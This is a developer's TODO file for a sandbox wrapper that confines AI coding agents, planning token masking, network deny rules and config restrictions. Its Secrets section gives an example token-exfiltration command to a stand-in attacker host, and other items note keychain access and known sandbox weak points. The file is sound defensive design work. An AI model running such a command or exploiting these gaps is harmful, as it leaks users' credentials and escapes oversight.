# TODO

## Secrets

- Per-command env files: `~/.blackwall/<command>.env` (e.g. `claude.env`, `codex.env`) goes only to that command, so tokens like `CLAUDE_CODE_OAUTH_TOKEN` stay away from every other sandboxed command without app-specific code in `blackwall.mjs`
- Mask `GH_TOKEN` with srt's `credentials`, its secret-masking feature: `credentials.envVars` with mode `mask` gives the sandboxed command a sentinel in place of the real value, and srt's proxy swaps the real secret in on the way out, only toward `injectHosts`. A leak through `curl evil.com -H "$GH_TOKEN"` under `"*"` then carries the sentinel. It limits exfiltration, not misuse: GitHub still gets the real token, so a run can still push with it. Same for files, e.g. `~/.npmrc`, with an `extract` regex for the secret part; `awsPairs` and `sigv4` cover AWS keys, which the proxy must re-sign. Not an `srt` pass-through, a feature: (1) over HTTPS the proxy sees only CONNECT, so swapping an `Authorization` header needs `network.tlsTerminate`, experimental, a MITM CA inside the sandbox with a trust bundle through env vars, and Go tools like `gh` then verify that CA through trustd, which is what `enableWeakerNetworkIsolation` is for; `allowPlaintextInject` stays off, since plain HTTP is unverified. (2) Secrets come from `~/.blackwall/.env` and presets set env, so the `github` preset should own the mask, with `injectHosts: ["api.github.com", "github.com"]`, and `--print-env` should show the sentinel. (3) `injectHosts` defaults to srt's `allowedDomains`, which under `"*"` is the preset hosts only because blackwall strips `"*"`; pin it, don't rely on that. Ships with an e2e check that the sentinel, not the token, reaches a non-GitHub host
- `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1` strips credentials from Claude's Bash tool, hooks, and MCP children, but since v2.1.251 it also strips `CLAUDE_CONFIG_DIR` (nested `claude` calls lose the profile) and likely `GH_TOKEN`

## Network

- Deny the on-link prefixes of this machine's own interfaces (`os.networkInterfaces()` cidr), so the LAN is covered whatever its numbering: `private-network` refuses RFC 1918, CGNAT, and ULA only, so a LAN host with a global IPv6 address or on a public-numbered LAN stays reachable
- `--print-network-access`: the effective network policy as text in evaluation order, the twin of `--print-file-access`, including srt's built-in refused classes that `--print-config` leaves out
- CIDR ranges in `network.allowedHosts`: the callback allows an IP literal inside the range. Needs `strictAllowlist` off whenever a CIDR is present, and a README note that it matches literal requests only, never a name resolving into the range

## Git

- Git worktree detection (agent-safehouse): when `git rev-parse --git-common-dir` is outside cwd and `--add-dir`s, grant it read/write and keep its `hooks/` and `config` in `denyWrite`. If it passes srt `git.safeDirectories`, srt numbers its `safe.directory` entries from the launcher's `GIT_CONFIG_COUNT`, not the child env's, so they overwrite the git preset's `commit.gpgsign=false`
- Signed commits from sandboxed runs: gpg can't reach `~/.gnupg`, so commits are unsigned. Until then: `git rebase --exec 'git commit --amend --no-edit -S' <base>`

## Config

- Should blackwall allow setting srt config in `config.json`? Today `srt` takes only the three keys in `default-config.json`, and both configs can set them. Exposing a key means listing it with its default in `default-config.json`, so it shows in `--print-config`; its tier decides which config may set it
  - Both configs, can't widen the sandbox: `ignoreViolations` (suppresses violation reports, not enforcement); `mandatoryDenySearchDepth` (Linux, how deep srt scans write paths for dangerous names; clamp at srt's default 3 so a repo can't lower it)
  - User config only, which needs a user-only tier the schema lacks: `network.allowUnixSockets` (`/var/run/docker.sock` is host access, per srt's README); `network.allowMachLookup` (XPC services for 1Password CLI, Playwright, the iOS Simulator; same class as the trustd hole); `network.allowLocalBinding` (dev servers that bind a port inside the sandbox); `bwrapPath`, `socatPath`, `seccomp`, `ripgrep.command`, `javaAgentJarPath` (binaries srt executes, so from a repo the sandbox would be the repo's own code)
  - Never: `allowAppleEvents` (srt's README: removes code-execution isolation, user-level only); `network.allowAllUnixSockets` (disables socket blocking); `network.httpProxyPort`, `network.socksProxyPort` (srt stops filtering, the external proxy must); `network.mitmProxy`, `network.tlsTerminate`, `network.filterRequest` (interception, and `filterRequest` is a function); `network.parentProxy` (already set through `HTTP_PROXY`, see Known Limitations in the README); srt's own `network` and `filesystem` lists, which blackwall builds; `windows`
  - `git.safeDirectories` collides with the git preset's `GIT_CONFIG_COUNT`, see the worktree item. `credentials` is a feature of its own, see the `GH_TOKEN` masking item under Secrets

## Unverified

- Data-protection keychain items through `com.apple.securityd.xpc`, which srt allows (login keychain items were shown unreadable: `security find-generic-password` can't find them)
